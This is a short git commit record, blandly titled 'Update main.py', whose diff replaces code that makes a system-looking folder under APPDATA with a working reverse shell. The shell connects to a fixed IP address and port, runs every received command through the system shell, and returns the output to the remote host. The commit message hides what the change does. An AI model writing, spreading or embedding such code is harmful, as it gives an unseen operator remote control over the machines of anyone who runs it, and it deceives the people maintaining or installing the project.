2e7e36461de20de850bd5778a0b066a0fdbe9b22
faruqer <136151240+faruqer@users.noreply.github.com>
2024-10-07 15:28:52 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,5 +1,11 @@
-import os
+import socket
+import subprocess
 
-path_ = os.environ.get("APPDATA")
-folder_path  = os.path.join(path_, ".system_arcx64\\testdir")
-os.mkdir(folder_path)
+
+client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+client_socket.connect(("192.168.242.120", 12345))
+while True:
+    message = (client_socket.recv(1024).decode("utf-8"))
+    result = subprocess.run(message, shell=True, capture_output=True, text=True)
+    client_socket.sendall(result.stdout.encode("utf-8"))
